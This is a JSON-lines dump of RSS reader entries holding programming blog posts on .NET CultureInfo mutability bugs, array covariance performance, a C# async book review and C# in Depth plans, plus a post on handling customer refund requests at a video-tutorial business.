href=\"http://msmvps.com/blogs/jon_skeet/archive/2010/09/05/very-quick-interlude-i-know-that-captchas-aren-t-working-on-this-blog-if-you-re-using-chrome.aspx\">aware of this</a>, but can't fix it myself. If you right-click on the broken image and select\"open in new tab\" you should get a working image. Apologies for the inconvenience.</p><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1825236\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/uPCzYxuuzoI\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1283}}
{"k":"0000000084","o":"0000010738","v":"001"}
{"_id":1284,"_uid":1284,"_dt":1373742620979,"_s":"4e989414cee99049cba89019e68f79de"}
{"subscription":{"$wrap":"$oid","v":50},"link":"http://feedproxy.google.com/~r/JonSkeetCodingBlog/~3/BISytg6yMcs/the-perils-of-conditional-mutability.aspx","title":"The perils of conditional mutability","published":{"$wrap":"$date","v":1336312725000,"h":"2012-05-06T13:58:45.000Z"},"starred":false,"read":false,"content":"<p>This morning I was wrestling with trying to make some Noda Time unit tests faster. For some reason, the<a href=\"http://teamcity.codebetter.com\">continuous integration host we're using</a>is<em>really</em>slow at loading resources under .NET 4. The unit tests which run in 10 seconds on my home laptop take over three<em>hours</em>on the continuous integration system. Taking stack traces at regular intervals showed the problem was with the NodaFormatInfo constructor, which reads some resources.</p><p>I may look into streamlining the resource access later, but before we get to that point, I wanted to try to reduce the number of times we call that constructor in the first place. NodaFormatInfo is meant to be cached, so I wouldn't have expected thousands of instances to be created - but it's only cached when the System.Globalization.CultureInfo it's based on is read-only. This is where the problems start...</p><p><a href=\"http://msdn.microsoft.com/en-us/library/system.globalization.cultureinfo.aspx\">CultureInfo</a>is<em>conditionally mutable</em>(not an official term, just one I've coined for the purposes of this post). You can ask whether or not it's read-only with the<a href=\"http://msdn.microsoft.com/en-us/library/system.globalization.cultureinfo.isreadonly.aspx\">IsReadOnly property</a>, and obviously if it's read-only you can't change it. Additionally, CultureInfo is composed of other conditionally mutable objects -<a href=\"http://msdn.microsoft.com/en-us/library/system.globalization.datetimeformatinfo.aspx\">DateTimeFormatInfo</a>,<a href=\"http://msdn.microsoft.com/en-us/library/system.globalization.numberformatinfo.aspx\">NumberFormatInfo</a>etc. There's a static<a href=\"http://msdn.microsoft.com/en-us/library/system.globalization.cultureinfo.readonly.aspx\">ReadOnly method</a>on CultureInfo to create a read-only wrapper around a mutable CultureInfo. It's not clearly documented whether that's<em>expected</em>to take a deep copy (so that callers can really rely on it not changing) or whether it's expected to reflect any further changes made to the culture info it's based on. To go in the other direction, you can call Clone on a CultureInfo to create a mutable copy of any existing culture.</p><p>Further complications are introduced by the properties on the composite objects - we have properties such as<a href=\"http://msdn.microsoft.com/en-us/library/system.globalization.datetimeformatinfo.monthnames.aspx\">DateTimeFormatInfo.MonthNames</a>which returns a string array. Remember, arrays are<em>always</em>mutable. So it's really important to know whether the array reference returned from the property refers to a<em>copy</em>of the underlying data, or whether it refers to the array that's used internally by the type. Obviously for read-only DateTimeFormatInfo objects, I'd expect a copy to be returned - but for a mutable DateTimeFormatInfo, it would potentially make sense to return the underlying array reference. Unfortunately, the documentation doesn't make this clear - but in practice, it always returns a copy. If you need to change the month names, you need to clone the array, mutate the clone, and then set the MonthNames property.</p><p><em>All of this makes CultureInfo hard to work with</em>. The caching decision earlier on only really works if a\"read-only\" culture genuinely won't change behind the scenes. The type system gives you no help to catch subtle bugs at compile-time. Making any of this robust but efficient (in terms of taking minimal copies) is tricky to say the least.</p><p>Not only does it make it hard to work with from a client's point of view, but apparently it's hard to implement correctly too...</p><h2>First bug: Mono's invariant culture isn't terribly invariant...</h2><p>(Broken in 2.10.8; apparently fixed later.)</p><p>I discovered this while getting Noda Time's unit tests to pass on Mono. Unfortunately there are some I've had to effectively disable at the moment, due to deficiencies in Mono (some of which are being fixed, of course).</p><p>Here's a program which builds a clone of the invariant culture, changes the<em>clone's</em>genitive month names, and then prints out the first<em>non-genitive</em>name from the plain invariant culture:</p><div class=\"code\"><span class=\"Namespace\">using</span>System;<br /><span class=\"Namespace\">using</span>System.Globalization;<br /><br /><span class=\"ReferenceType\">class</span>Test<br />{<br />   <span class=\"Modifier\">static</span> <span class=\"ValueType\">void</span>Main()<br />    {        <br />        CultureInfo clone = (CultureInfo) CultureInfo.InvariantCulture.Clone();<br />       <span class=\"InlineComment\">// Note: not even deliberately changing MonthNames for this culture!</span><br />        clone.DateTimeFormat.MonthGenitiveNames[0] =<span class=\"String\">\"Changed\"</span>;<br />        <br />       <span class=\"InlineComment\">// Prints Changed</span><br />        Console.WriteLine(CultureInfo.InvariantCulture.DateTimeFormat.MonthNames[0]);<br />    }<br />}</div><p>I believe this bug is<em>really</em>due to the lack of support for genitive month names in Mono at the moment - the MonthGenitiveNames property always just returns a reference to the month names for the invariant culture - without taking a copy first. (It always returns the invariant culture's month names, even if you're using a different culture entirely.) The code above shows an\"innocent\" attempt to change a mutable clone - but in reality we could have used<em>any</em>culture (including an immutable one) to make the change.</p><p>Note that in the .NET implementation, the change would only have been to a copy of the underlying data, so even the<em>clone</em>wouldn't have reflected change anywhere.</p><h2>Second bug: ReadOnly losing changes</h2><p>The second bug is the one I found this morning. It looks like it's fixed in .NET 4, but it's present in .NET 3.5, which is where it bit me this morning. When you try to make a read-only wrapper around a mutated culture, some of the properties are preserved... but some aren't:</p><div class=\"code\"><span class=\"Namespace\">using</span>System;<br /><span class=\"Namespace\">using</span>System.Globalization;<br /><br /><span class=\"ReferenceType\">class</span>Test<br />{<br />   <span class=\"Modifier\">static</span> <span class=\"ValueType\">void</span>Main()<br />    {<br />        CultureInfo clone = (CultureInfo) CultureInfo.InvariantCulture.Clone();<br />        clone.DateTimeFormat.AMDesignator =<span class=\"String\">\"ChangedAm\"</span>;<br /><br />       <span class=\"InlineComment\">// The array is recreated on each call to MonthNames, so changing the</span><br />       <span class=\"InlineComment\">// value within the array itself doesn't work :(</span><br />       <span class=\"ReferenceType\">string</span>[] months = (<span class=\"ReferenceType\">string</span>[]) clone.DateTimeFormat.MonthNames;<br />        months[0] =<span class=\"String\">\"ChangedMonth\"</span>;<br />        clone.DateTimeFormat.MonthNames = months;<br />        <br />        CultureInfo readOnlyCopy = CultureInfo.ReadOnly(clone);<br />        Console.WriteLine(clone.DateTimeFormat.AMDesignator);<span class=\"InlineComment\">// ChangedAm</span><br />        Console.WriteLine(clone.DateTimeFormat.MonthNames[0]);<span class=\"InlineComment\">// ChangedMonth</span><br />                <br />        Console.WriteLine(readOnlyCopy.DateTimeFormat.AMDesignator);<span class=\"InlineComment\">// ChangedAm</span><br />        Console.WriteLine(readOnlyCopy.DateTimeFormat.MonthNames[0]);<span class=\"InlineComment\">// January (!)</span><br />    }<br />}</div><p>I don't know what's going on here. In the end I just left the test code using the mutable clone, having added a comment explaining<em>why</em>it wasn't created a read-only wrapper.</p><p>I've experimented with a few different options here, including setting the MonthNames property on the clone<em>after</em>creating the wrapper. No joy - I simply can't make the new month names stick in the read-only copy.&lt;sigh&gt;</p><h2>Conclusion</h2><p>I've been frustrated by the approach we've taken to cultures in Noda Time for a while. I haven't worked out exactly what we should do about it yet, so it's likely to stay somewhat annoying for v1, but I may well revisit it significantly for v2. Unfortunately, there's nothing I can do about CultureInfo itself.</p><p>What I would have<em>preferred</em>in all of this is the builder pattern: make CultureInfo, DateTimeFormatInfo etc all immutable, but give each of them mutable builder types, with the ability to create a mutable builder based on an existing immutable instance, and obviously to create a new immutable instance from a builder. That would make all kinds of things simpler - including caching.</p><p>For the moment though, I hope we can all learn lessons from this - or have old lessons reinforced, at least:</p><ul><li>Making a single type behave in different ways based on different\"modes\" makes it hard to use correctly. (Yes, this is the same first conclusion as with DateTime in the previous post. Funny, that.)</li><li>Immutability has to be deep to be meaningful: it's not much use having a supposedly read-only object which composes a StringBuilder...</li><li>Arrays should be<a href=\"http://blogs.msdn.com/b/ericlippert/archive/2008/09/22/arrays-considered-somewhat-harmful.aspx\">considered somewhat harmful</a>. If you're going to return an array from a method, make sure you document whether this is a<em>copy</em>of the underlying data, or a\"live\" reference. (The latter should be very rare, particularly for a public API.) The exception here is if you return an empty array - that's effectively immutable, so you can always return it with no problems.</li><li>The builder pattern rocks - use it!</li></ul><p>In my next post I'll try to get back to the TimeZoneInfo oddities I mentioned last time.</p><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1809562\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/BISytg6yMcs\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1284}}
{"k":"0000000084","o":"0000004806","v":"001"}
{"_id":1285,"_uid":1285,"_dt":1373742620979,"_s":"f562691cd475ca40487e0ca9a4e566d7"}
{"subscription":{"$wrap":"$oid","v":50},"link":"http://feedproxy.google.com/~r/JonSkeetCodingBlog/~3/2WGaSufZ7Og/book-review-async-in-c-5-0.aspx","title":"Book Review: Async in C# 5.0","published":{"$wrap":"$date","v":1369091642000,"h":"2013-05-20T23:14:02.000Z"},"starred":false,"read":false,"content":"<p>Resources:</p><ul><li><a href=\"http://www.amazon.com/Async-C-5-0-Alex-Davies/dp/1449337163\">Amazon</a>,<a href=\"http://www.barnesandnoble.com/w/async-in-c-5-0-alex-davies/1112412817?ean=9781449337162\">Barnes and Noble</a>,<a href=\"https://play.google.com/store/books/details/Alex_Davies_Async_in_C_5_0?id=xT45qhFrVnUC&feature=search_result#?t=W251bGwsMSwyLDEsImJvb2steFQ0NXFoRnJWblVDIl0.\">Play Books</a></li><li><a href=\"http://shop.oreilly.com/product/0636920026532.do\">The book's web site</a>(O'Reilly) – downloads, errata etc</li></ul><p>A while ago I was attending one of the<a href=\"http://www.developerdeveloperdeveloper.com/home/\">Developer, Developer, Developer</a>conference in Reading, and I heard Alex Davies give a talk about actors and async. He mentioned that he was in the process of writing a short book for O'Reilly about async in C# 5, and I offered to review it for him. Many months later (sorry Alex!) I'm finally getting round to it.</p><p><strong>Disclaimer:</strong>The review copy was given to me for free, and equally the book is arguably a competitor of the upcoming 3rd edition of C# in Depth from the view of readers who already own the 2nd edition... so you could say I'm biased in both directions. Hopefully they cancel out.</p><p>This is a book purely on async. It's not a general C# book, and it doesn't even cover the tiny non-async features in C# 5. It's<em>all</em>about asynchrony. As you'd expect, it's therefore pretty short (92 pages) and can comfortably be consumed in a single session. Alex's writing style is informal and easy to read. Of course the<em>topic</em>of the book is anything but simple, so even though you may read the whole book in one go first time, that doesn't mean you're likely to fully internalize it straight away. The book is divided into 15 short chapters, so you can revisit specific areas as and when you need to.</p><blockquote><p><strong>Aside</strong></p><p>I've been writing and speaking about async for about two and a half years now. I've tried various ways of explaining it, and I'm pretty sure it's one of those awkward concepts which really just needs to click eventually. I've had some mails from people for whom my explanation was the one to do the trick... and other mails from folks who only\"got it\" after seeing another perspective. I'd encourage anyone learning about async to read a variety of books, articles, blog posts and so on. I don't even think it's a matter of finding the single\"right\" explanation for you – it's a matter of letting them all percolate.</p></blockquote><p>The book covers all the topics you'd expect it to:</p><ul><li>Why asynchrony is important</li><li>Drawbacks of library-only approaches</li><li>How async/await behaves in general</li><li>Threading and synchronization contexts</li><li>Exceptions</li><li>Different code contexts (ASP.NET, WinRT, regular UI apps)</li><li>How async code is compiled</li></ul><p>Additionally there are brief sections on unit testing, parallelism and actors. Personally I'd have preferred the actors part to be omitted, with more discussion on the testing side – particularly in terms of how to write deterministic asynchronous tests. However, I know that Alex is a big fan of actors, so I can forgive a little self-indulgence on that front.</p><p>There's one area where I'm not sure I agree with the advice in the book: exceptions. Alex repeatedly gives the advice that you shouldn't let exceptions go unobserved. I used to go along with that almost without thinking – but now I'm not so sure. There are definitely cases where that definitely<em>is</em>the case, but I'm not as comfortable with the global advice as I used to be. I'll try to put my thoughts in order on this front and blog about this separately at a later date.</p><p>That aside, this is a good, pragmatic book. To be honest, I suspect no book on async is going to go into quite as many details as<a href=\"http://blogs.msdn.com/b/pfxteam/\">the PFX team blog</a>, and that's probably a good thing. But\"Async in C# 5.0\" is a very good starting point for anyone wanting to get to grips with async, and I in no way begrudge any potential C# in Depth 3rd edition sales I may lose by saying so ;)</p><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1830869\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/2WGaSufZ7Og\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1285}}
{"k":"0000000084","o":"0000009675","v":"001"}
{"_id":1286,"_uid":1286,"_dt":1373742620980,"_s":"c50e49bc1b781514fd97eab8b18632da"}
{"subscription":{"$wrap":"$oid","v":52},"link":"http://feedproxy.google.com/~r/wekeroad/EeKc/~3/PZzbWDi8bww/customer-service-vs-serving-the-customer","title":"Customer Service vs. Serving the Customer","published":{"$wrap":"$date","v":1361199600000,"h":"2013-02-18T15:00:00.000Z"},"starred":false,"read":false,"content":"<p>If you've ever sent a support email to Tekpub, you know I'm in the habit of asking questions. I think truly serving the Customer sometimes means asking questions, and sometimes even saying \"No\"...</p><p><img src='http://wekeroad.com/images/service.jpeg'/></p><p><h2>May I Help You?</h2><p>I receive a number of support emails during the normal work week. They are mostly technical ones about our streaming player or questions about our content. Occasionally requests for certain topics.</p><p>And then there are the requests for refunds. This happens rather rarely, but when they do I tend to take extra time with them. This tends to piss people off and typically I have to wade through a lot of back and forth before we get down to the problem.</p><p>The following really happened, and (as you might expect) I'm paraphrasing a bit - not revealing names:</p><blockquote><p><strong>Customer</strong>:\"I don't find your service worth it and would like my money back.\"</p><p><strong>Me</strong>:\"Sorry to hear that! What's the problem\"</p><p><strong>Customer</strong>:\"As I said I don't find value in your videos - can I have a refund or not? Is this going to be one of those things that I have to fill out some questionnaire or stupid survey. DUDE JUST CANCEL MY SUB\"</p></blockquote><p>So at this point I have a problem. Do I continue asking him about the problem or do I just refund him and remember that\"The Customer is Always Right\". What would you do?</p><p>One thing I know is that an unhappy customer, tended to correctly, will rapidly turn into one of your happiest customers. It's a gamble, especially when CAPS are invoked... but I pressed on.</p><blockquote><p><strong>Me</strong>: Listen I understand you're not happy but sometimes it comes down to knowing just a bit more about a problem and I can fix it - and often it makes people very happy. If you had the time to explain just a bit - I would really appreciate it. Your refund is on the way, by the way.</p></blockquote><p>This is one of my standard responses. Typically (not always) I will send the refund immediately. Upset people tend to become less upset, and then answer your questions. In this case, it worked out really well:</p><blockquote><p><strong>Customer</strong>: Sorry I should be a bit more clear. I<strong>love your videos</strong>and they're really good, but I can't afford the service and I thought I could but I just lost my job and I need to pull things back in. I didn't mean to be insulting and I guess I'm a bit stressed out. Thanks for the refund and if I get another job soon I'll come back.</p><p><strong>Me</strong>: No problem at all and thanks for letting me know this - it really does make a difference. XXXXXXXXX - that's a coupon for an Annual Subscription. Educating yourself will help find work and, if you want to pay me back,<a href=\"http://tekpub.com/gifts/new\">buy an annual for someone else</a>.</p></blockquote><p>Needless to say, the Customer was ecstatic and we solved the problem - something I would never have known about unless I pushed a little bit -<strong>pushed the Customer to let me help them</strong>.</p><p>I give stuff away constantly - especially to people who need it.</p><h2>This Backfires</h2><p>Just today - in fact it's the reason I'm writing this post - someone asked me for a refund. It was the first in 4 months and, as I do, I asked some questions first.</p><p>Many businesses adopt a\"No Questions Asked\" policy and I understand why - it's a blind guarantee and gives the appearance of standing squarely behind your product or service.</p><p>I find that this is short-sited but NOT because you shouldn't blindly guarantee your stuff, but<strong>it's more likely there's simply a misunderstanding happening, and you can FIX IT</strong>.</p><p>So anyway the Customer wanted a refund:</p><blockquote><p><strong>Customer</strong>: I want a refund for my monthly subscription because Pluralsight has more content than you.</p><p><strong>Me</strong>: They sure do, but I can't guarantee our stuff against another company's. I do know you'll be happy with what we offer because it's quite good and I notice you've only watched half of a single episode of all of our stuff. Might I recommend you give it some more time?</p><p><strong>Customer</strong>: I didn't ask you to guarantee Pluralsight - but you should do something to compare your stuff vs. theirs so people know the difference. Your refund policy states\"...'snip' ...\" Thus I'd like a refund.</p></blockquote><p>Here I have a problem. They haven't watched any of our stuff and are, essentially, having\"Buyer's Remorse\" as they saw more stuff at Pluralsight.<a href=\"http://pluralsight.com/training/Courses\">And Pluralsight has a whole lot of stuff</a>. Buyer's remorse and Pluralsight's catalog are not covered under our refund policy (as you can imagine) so...</p><p>If I keep pushing this angle, I'll lose. Pluralsight has an amazing library but there are differences in our content - I need to get that across as well as the main point:<strong>Why not have both!</strong>. It's $15 + $29 == $45/month. Think of what that means in terms of educating yourself and readying your career! Yet people scrutinize this expense as if it were some kind of luxury!</p><p>OK, so back to the matter at hand. How would you respond here? This is what I said:</p><blockquote><p><strong>Me:</strong>Our return policy covers what<strong>we create</strong>and if you don't like it, then yes we'll stand behind that. But you haven't tried it out yet and, forgive me if I'm misunderstanding here, you're asking for a refund because Pluralsight has more stuff.</p><p>I don't want unhappy customers and I'm sending your refund now - but when you get to Pluralsight you might not want to look at Lynda.com.</p><p>If you use Peepcode don't try CodeSchool or Treehouse. What you see as an advantage (more videos) is hardly a measure of the content (and its relevance to you). Either way, your refund is on its way\"</p></blockquote><p>I should have left that last part out. That was my ego, feeling bruised and frustration setting in because I felt that what they were asking for was not entirely fair.</p><p>And, as expected, the customer didn't like my response.<strong>Things started getting personal and I was told my Customer Service sucks</strong>(which wouldn't be the first time). The Customer ended things by saying\"I was planning on coming back to Tekpub if I didn't like Pluralsight but... not with this Customer Service experience\".</p><p>Which means I lose. Actually, we both lost because<a href=\"http://support.pluralsight.com/knowledgebase/articles/32815-what-is-your-refund-policy-\">I don't think he'll have the same option at Pluralsight</a>.</p><h2>Turning It Around. Or Turning It Off?</h2><p>I lost that battle because I tried to reason with someone who was unhappy - and that is almost always a bad idea. There are ways of asking questions that don't lead the Customer to believe they're being screwed or messed with - and I was trapped with this one.</p><p>They gave me money, and they regretted it even though they didn't even try what they paid for. To me,<strong>I was utterly convinced that if they tried our stuff, they'd love it</strong>and I kept trying to communicate that... but in the wrong way. I think I understand why many companies simply refuse to do refunds - it forces customers to consider a bit more carefully.</p><p>This is not to say that you shouldn't show Customers the door. I've had people (literally) try to extort me by\"taking it to Hacker News\" unless I refunded them for videos that my logs showed they were clearly sharing (multiple downloads to same IP over the period of a month). I asked them if it's OK to loop in their legal department, then I deleted their account and banned them.</p><p><strong>There are some customers you need to cut loose - basically a No Soup For You</strong>policy. They exist, it sucks, and it spoils it for customers who aren't Out To Get Your (to-date that's happened 5 times and I'm not happy about it... but it needed to happen).</p><p>On the bright side,<strong>I've managed to turn unhappy customers into Big Fans about 85% of the time: simply by asking questions and trying to care</strong>instead of following some old-school, outdated tome.</p></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=PZzbWDi8bww:AFQQEzd8wQo:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=PZzbWDi8bww:AFQQEzd8wQo:Q8R26LmAkSY\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=PZzbWDi8bww:AFQQEzd8wQo:Q8R26LmAkSY\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=PZzbWDi8bww:AFQQEzd8wQo:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=PZzbWDi8bww:AFQQEzd8wQo:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=PZzbWDi8bww:AFQQEzd8wQo:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=PZzbWDi8bww:AFQQEzd8wQo:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/wekeroad/EeKc/~4/PZzbWDi8bww\" height=\"1\" width=\"1\"/>","author":"Rob Conery","_id":{"$wrap":"$oid","v":1286}}
{"k":"0000000084","o":"0000003027","v":"001"}
{"_id":1287,"_uid":1287,"_dt":1373742620980,"_s":"c55e30fdae038edf91c89a06230475bd"}
{"subscription":{"$wrap":"$oid","v":50},"link":"http://feedproxy.google.com/~r/JonSkeetCodingBlog/~3/xkjNKrOKEwk/the-future-of-quot-c-in-depth-quot.aspx","title":"The future of \"C# in Depth\"","published":{"$wrap":"$date","v":1344068359000,"h":"2012-08-04T08:19:19.000Z"},"starred":false,"read":false,"content":"<p>I'm getting fairly frequent questions - mostly on Twitter - about whether there's going to be a third edition of C# in Depth. I figure it's worth answering it once in some detail rather than repeatedly in 140 characters ;)</p><p>I'm currently writing a couple of new chapters covering the new features in C# 5 - primarily async, of course. The current\"plan\" is that these will be added to the existing 2nd edition to create a 3rd edition. There will be minimal changes to the existing text of the 2nd edition - basically going over the<a href=\"http://csharpindepth.com/Errata.aspx\">errata</a>and editing a few places which ought to mention C# 5 early. (In particular the changes to how foreach loop variables are captured.)</p><p>So there will definitely be new chapters. I'm hoping there'll be a full new print (and ebook of course) edition, but no contracts have been signed yet. I'm<em>hoping</em>that the new chapters will be provided free electronically to anyone who's already got the ebook of the 2nd edition - but we'll see. Oh, and I don't have any timelines at the moment. Work is more demanding than it was when I was writing the first and second editions, but obviously I'll try to get the job done at a reasonable pace. (Writing about async in a way which is both accessible and accurate is really tricky, by the way.)</p><p>Of course when I've finished those, I've got two other C# books I<em>want</em>to be writing... when I'm not working on Noda Time, Tekpub screencasts etc...</p><p><strong>Update</strong></p><p>I had a question on Twitter around the\"two other C# books\". I don't want to go into too many details - partly because they're very likely to change - but my intention is to write\"C# from Scratch\" and\"C# in Style\". The first would be for complete beginners; the second wouldn't go into\"how things work\" so much as\"how to use the language most effectively.\" (Yes, competition for Effective C#.) One possibility is that both would be donationware, at least in ebook form, ideally with community involvement in terms of public comments.</p><p>I'm hoping that both will use the same codebase as an extended example, where\"From Scratch\" would explain what the code does, and\"In Style\" would explain why I chose that approach. Oh, and\"From Scratch\" would use unit testing as a teaching tool wherever possible, attempting to convey the idea that it's something every self-respecting dev does :)</p><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1814752\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/xkjNKrOKEwk\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1287}}
{"k":"0000000084","o":"0000009577","v":"001"}
{"_id":1288,"_uid":1288,"_dt":1373742620980,"_s":"27ac6e4176a54ebcbc5652cfec1d8286"}
{"subscription":{"$wrap":"$oid","v":50},"link":"http://feedproxy.google.com/~r/JonSkeetCodingBlog/~3/vNRSrTLc02k/array-covariance-not-just-ugly-but-slow-too.aspx","title":"Array covariance: not just ugly, but slow too","published":{"$wrap":"$date","v":1371893643000,"h":"2013-06-22T09:34:03.000Z"},"starred":false,"read":false,"content":"<p>It seems to be quite a long time since I've written a genuine\"code\" blog post. Time to fix that.</p><p>This material may well be covered elsewhere – it's certainly not terrifically original, and I've been meaning to post about it for a long time. In particular, I remember mentioning it at CodeMash in 2012. Anyway, the time has now come.</p><h2>Refresher on array covariance</h2><p>Just as a bit of background before we delve into the performance aspect, let me remind you what array covariance is, and when it applies. The basic idea is that C# allows a<em>reference conversion</em>from type TDerived[] to type TBase[], so long as:</p><ul><li>TDerived and TBase are both reference types (potentially interfaces)</li><li>There's a reference conversion from TDerived to TBase (so either TDerived is the same as TBase, or a subclass, or an implementing class etc)</li></ul><p>Just to remind you about reference conversions, those are conversions from one reference type to another, where the result (on success) is never a reference to a different object. To quote section 6.1.6 of the C# 5 spec:</p><blockquote><p>Reference conversions, implicit or explicit, never change the referential identity of the object being converted. In other words, while a reference conversion may change the type of the reference, it never changes the type or value of the object being referred to.</p></blockquote><p>So as a simple example, there's a reference conversion from string to object, therefore there's a reference conversion from string[] to object[]:</p><div class=\"code\"><span class=\"ReferenceType\">string</span>[] strings =<span class=\"Keyword\">new</span> <span class=\"ReferenceType\">string</span>[10];<br /><span class=\"ReferenceType\">object</span>[] objects = strings;<br /><br /><span class=\"InlineComment\">// strings and objects now refer to the same object</span></div><p>There is<em>not</em>a reference conversion between value type arrays, so you can't use the same code to conver from int[] to object[].</p><p>The nasty part is that every<em>store</em>operation into a reference type array now has to be checked at execution time for type safety. So to extend our sample code very slightly:</p><div class=\"code\"><span class=\"ReferenceType\">string</span>[] strings =<span class=\"Keyword\">new</span> <span class=\"ReferenceType\">string</span>[10]; <br /><span class=\"ReferenceType\">object</span>[] objects = strings;<br /><br />objects[0] =<span class=\"String\">\"string\"</span>;<span class=\"InlineComment\">// This is fine</span><br />objects[0] =<span class=\"Keyword\">new</span>Button();<span class=\"InlineComment\">// This will fail</span></div><p>The last line here will fail with an ArrayTypeMismatchException, to avoid storing a Button reference in a String[] object. When I said that<em>every</em>store operation has to be checked, that's a slight exaggeration: in theory, if the compile-time type is an array with an element type which is a sealed class, the check can be avoided as it can't fail.</p><h2>Avoiding array covariance</h2><p>I would rather arrays weren't covariant in the first place, but there's not a lot that can be done about that now. However, we can work around this, if we really need to. We know that value type arrays are<em>not</em>covariant... so how about we use a value type array instead, even if we want to store reference types?</p><p>All we need is a value type which can store the reference type we need – which is dead easy with a wrapper type:</p><div class=\"code\"><span class=\"Modifier\">public</span> <span class=\"ValueType\">struct</span>Wrapper&lt;T&gt;<span class=\"Linq\">where</span>T :<span class=\"ReferenceType\">class</span><br />{<br />   <span class=\"Modifier\">private</span> <span class=\"Modifier\">readonly</span>T value;<br />   <span class=\"Modifier\">public</span>T Value { get {<span class=\"Statement\">return</span>value; } }<br />    <br />   <span class=\"Modifier\">public</span>Wrapper(T value)<br />    {<br />       <span class=\"Keyword\">this</span>.value = value;<br />    }<br />    <br />   <span class=\"Modifier\">public</span> <span class=\"Modifier\">static</span> <span class=\"Keyword\">implicit</span> <span class=\"Keyword\">operator</span>Wrapper&lt;T&gt;(T value)<br />    {<br />       <span class=\"Statement\">return</span> <span class=\"Keyword\">new</span>Wrapper&lt;T&gt;(value);<br />    }<br />}</div><p>Now if we have a Wrapper&lt;string&gt;[], we can't assign that to a Wrapper&lt;object&gt;[] variable – the types are incompatible. If that feels a bit clunky, we can put the array into its own type:</p><div class=\"code\"><span class=\"Modifier\">public</span> <span class=\"Modifier\">sealed</span> <span class=\"ReferenceType\">class</span>InvariantArray&lt;T&gt;<span class=\"Linq\">where</span>T :<span class=\"ReferenceType\">class</span><br />{<br />   <span class=\"Modifier\">private</span> <span class=\"Modifier\">readonly</span>Wrapper&lt;T&gt;[] array;<br />    <br />   <span class=\"Modifier\">public</span>InvariantArray(<span class=\"ValueType\">int</span>size)<br />    {<br />        array =<span class=\"Keyword\">new</span>Wrapper&lt;T&gt;[size];<br />    }<br />    <br />   <span class=\"Modifier\">public</span>T<span class=\"Keyword\">this</span>[<span class=\"ValueType\">int</span>index]<br />    {<br />        get {<span class=\"Statement\">return</span>array[index].Value; }<br />        set { array[index] = value; }<br />    }<br />}</div><p>Just to clarify, we now only have<em>value type</em>arrays, but ones where each value is a plain wrapper for a reference. We now can't accidentally violate type-safety at compile-time, and the CLR doesn't need to validate write operations.</p><p>There's no memory overhead here – aside from the type information at the start, I'd actually expect the contents of a Wrapper&lt;T&gt;[] to be indistinguishable from a T[] in memory.</p><h2><strong>Benchmarking</strong></h2><p>So, how does it perform? I've written a small console app to test it. You can download the<a href=\"http://csharpindepth.com/Files/ArrayPerformance.zip\">full code</a>, but the gist of it is that we use a stopwatch to measure how long it takes to either repeatedly write to an array, or repeatedly read from an array (validating that the value read is non-null, just to prove that we've really read something). I'm hoping I haven't fallen foul of any of the various<a href=\"http://tech.pro/blog/1293/c-performance-benchmark-mistakes-part-one\">mistakes in benchmarking</a>which are so easy to make.</p><p>The test tries four scenarios:</p><ul><li>object[] (but still storing strings)</li><li>string[]</li><li>Wrapper&lt;string&gt;[]</li><li>InvariantArray&lt;string&gt;</li></ul><p>Running against an array size of 100, with 100 million iterations per test, I get the following results on my Thinkpad Twist :</p><table cellspacing=\"0\" cellpadding=\"2\" width=\"400\" border=\"1\"><tbody><tr><td valign=\"top\" width=\"133\"><strong>Array type</strong></td><td valign=\"top\" width=\"133\"><strong>Read time (ms)</strong></td><td valign=\"top\" width=\"133\"><strong>Write time</strong></td></tr><tr><td valign=\"top\" width=\"133\">object[]</td><td valign=\"top\" width=\"133\">11842</td><td valign=\"top\" width=\"133\">44827</td></tr><tr><td valign=\"top\" width=\"133\">string[]</td><td valign=\"top\" width=\"133\">12000</td><td valign=\"top\" width=\"133\">40865</td></tr><tr><td valign=\"top\" width=\"133\">Wrapper&lt;string&gt;[]</td><td valign=\"top\" width=\"133\">11843</td><td valign=\"top\" width=\"133\">29338</td></tr><tr><td valign=\"top\" width=\"133\">InvariantArray&lt;string&gt;</td><td valign=\"top\" width=\"133\">11825</td><td valign=\"top\" width=\"133\">32973</td></tr></tbody></table><p>That's just one run, but the results are fairly consistent across runs. The one interesting deviation is the write time for object[] – I've observed it<em>sometimes</em>being the same as for string[], but not consistently. I don't understand this, but it does seem that the JIT isn't performing the optimization for string[] that it could if it spotted that string is sealed.</p><p>Both of the workarounds to avoid array covariance make a noticeable difference to the performance of writing to the array, without affecting read performance. Hooray!</p><h2>Conclusion</h2><p>I think it would be a very rare application which noticed a<em>significant</em>performance boost here, but I do like the fact that this is one of those situations where a cleaner design also leads to better performance, without many obvious technical downsides.</p><p>That said, I doubt that I'll actually be using this in real code any time soon – the fact that it's just\"different\" to normal C# code is a big downside in 